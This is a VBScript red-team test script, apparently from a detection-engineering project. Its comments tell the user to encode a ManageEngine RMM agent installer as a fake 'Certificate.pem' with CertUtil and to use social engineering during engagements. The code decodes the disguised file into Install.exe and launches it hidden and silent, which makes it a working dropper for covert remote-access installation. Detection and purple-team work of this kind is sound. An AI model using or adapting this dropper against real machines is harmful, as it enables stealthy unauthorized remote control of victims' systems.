' Test script for detection engineering related to RMM Central for AutoRMM project 
' See ReadMe.md / note: requires PEM file encoding the install executable for this script to work (see below).
' For ethical red/purple team testing purposes only, following all laws and standards of ethical conduct.  
' Save this to a .vbs file extension. 
' Setup RMM Central from Manage Engine as a free trial. 
' Download the agent exe (see ReadMe.md)
' User CertUtil -encode to create a certificate file called Certificate.pem
' Place this vbs script and Certificate.pem in the same directory.
' Run the script
' Follow the installation prompts / user interaction social engineering needed if using as part of a red team engagement. 

Option Explicit

Dim fso, shell, stream, xmlDoc, nodeElem
Dim scriptFolder, pemPath, certText, b64, certBytes, savePath

' 1) Locate the folder where this script lives
Set fso = CreateObject("Scripting.FileSystemObject")
scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)

' 2) Read the PEM file
pemPath = scriptFolder & "\" & "Certificate.pem"
If Not fso.FileExists(pemPath) Then
    WScript.Echo "ERROR: Certificate.pem not found in " & scriptFolder
    WScript.Quit 1
End If

certText = fso.OpenTextFile(pemPath, 1).ReadAll()

' 3) Strip the markers & whitespace
b64 = Replace(certText, "-----BEGIN CERTIFICATE-----", "")
b64 = Replace(b64, "-----END CERTIFICATE-----", "")
b64 = Replace(b64, vbCr, "")
b64 = Replace(b64, vbLf, "")
b64 = Replace(b64, " ", "")
b64 = Trim(b64)

' 4) Decode Base64 via MSXML
Set xmlDoc   = CreateObject("MSXML2.DOMDocument.6.0")
Set nodeElem = xmlDoc.createElement("Base64Data")
nodeElem.DataType = "bin.base64"
nodeElem.Text     = b64
certBytes = nodeElem.nodeTypedValue

' 5) Write binary out as Install.exe next to the script
savePath = scriptFolder & "\" & "Install.exe"
Set stream = CreateObject("ADODB.Stream")
With stream
  .Type = 1               ' adTypeBinary
  .Open
  .Write certBytes
  .SaveToFile savePath, 2  ' adSaveCreateOverWrite
  .Close
End With

' 6) Launch the EXE  
Set shell = CreateObject("WScript.Shell")
' Launch in hidden mode, silent install, no blocking:
shell.Run Chr(34) & savePath & Chr(34) & " /silent", 0, False

' Clean up
Set nodeElem = Nothing
Set xmlDoc   = Nothing
Set stream   = Nothing
Set fso      = Nothing
Set shell    = Nothing
